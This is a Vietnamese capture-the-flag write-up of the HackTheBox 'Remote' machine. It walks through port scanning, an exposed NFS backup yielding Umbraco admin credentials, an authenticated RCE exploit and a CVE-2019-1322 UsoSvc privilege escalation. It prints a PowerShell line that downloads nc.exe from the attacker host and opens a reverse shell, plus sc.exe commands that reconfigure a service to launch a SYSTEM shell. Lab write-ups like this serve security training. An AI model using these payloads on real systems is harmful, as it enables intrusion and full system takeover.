![image](https://hackmd.io/_uploads/SkdLLpx20.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/Remote/information) 

## Comment

# Recon
## nmap
Sử dụng nmap ta, scan được vài port trong đó có ftp, http, nfs và smb
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.180       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 10:31 EDT
Nmap scan report for 10.10.10.180
Host is up (0.23s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 3.85 seconds
```
Từ đây, ta sẽ scan tiếp các port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p21,80,111,135,139,445,2049 -sCV 10.10.10.180 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 11:56 EDT
Nmap scan report for 10.10.10.180
Host is up (0.23s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-31T15:57:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.33 seconds
```

## Port 21  - ftp
Từ nmap ta có thể thấy được có thể login không cần credential

![image](https://hackmd.io/_uploads/S1OMkplhC.png)

Tuy nhiên nó lại trống 

## Port 80 - http
Ta được điều hướng đến 1 trang web: 

![image](https://hackmd.io/_uploads/HJGtkpx20.png)

### whatweb
Ta biết được nó sử dụng CMS **Umbraco**

![image](https://hackmd.io/_uploads/H1X1g6ghR.png)

### Gobuster
Scan có khá nhiều path nhưng không có tính năng gì có thể khai thác ngoài `/umbraco` dẫn đến 1 form login 

![image](https://hackmd.io/_uploads/Bk0ue6l3A.png)

![image](https://hackmd.io/_uploads/rkYjgae2A.png)

### Searchsploit
Sử dụng searchsploit thì thấy lỗ hổng có thể RCE tuy nhiên phải có credential

![image](https://hackmd.io/_uploads/HJIgb6g2A.png)

### Port 445 - SMB
Ta sẽ kiểm tra xem máy chủ này có shared folder nào không
```
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N -L //10.10.10.180
session setup failed: NT_STATUS_ACCESS_DENIED
```
### Port 2049 - NSF
Sử dụng `showmount` thấy được thư mục `site_backups`
```
┌──(kali㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```
![image](https://hackmd.io/_uploads/ryilUTl3A.png)

Sau khi tìm hiểu [google](https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials) ta biết được credential nằm ở `Umbraco.sdf`

![image](https://hackmd.io/_uploads/SkS3_axnC.png)

![image](https://hackmd.io/_uploads/Sy28vTl20.png)

# User flag
## Exploit
### John The Ripper
Từ trên ta biết được một mã hash và nó dùng SHA1:

![image](https://hackmd.io/_uploads/SJ66P6e3R.png)

`adminadmin@htb.local:baconandcheese`

### [46153.py]
Vì đã có được credential, nên ta chỉ cần sửa lại payload và chạy 
```
Invoke-WebRequest -Uri http://10.10.14.93:8888/nc.exe -OutFile C:/windows/temp/nc.exe; C:/windows/temp/nc.exe 10.10.14.93 1234 -e powershell
```

![image](https://hackmd.io/_uploads/BynaYpxh0.png)

![image](https://hackmd.io/_uploads/HkVg9pg3A.png)

## Post-Exploit
```
PS C:\windows\system32\inetsrv> type C:\Users\Public\Desktop\user.txt
type C:\Users\Public\Desktop\user.txt
411e7b340a802f7d1e****
```

# Root flag 
## Exploit
Ta sẽ tìm xem có service UsoSvc (CVE-2019-1322) đang chạy không
```
PS C:\windows\temp> Get-Service | Where-Object { $_.Name -eq "UsoSvc" }
G
et-Service | Where-Object { $_.Name -eq "UsoSvc" }

Status   Name               DisplayName                           
------   ----               -----------                           
Running  UsoSvc             Update Orchestrator Service  
```
### CVE-2019-1322
Dễ dàng thực hiện các bước và lấy được quyền root
```
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\windows\system32> sc.exe config usosvc binPath="C:\windows\temp\nc.exe 10.10.14.93 4444 -e cmd.exe"
PS C:\windows\system32> sc.exe qc usosvc
PS C:\windows\system32> sc.exe start UsoSvc
```
![image](https://hackmd.io/_uploads/Hy8p8Cl3R.png)


## Post-Exploit
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
3d36638eac064e0a0******
```
![image](https://hackmd.io/_uploads/HytvQAenA.png)


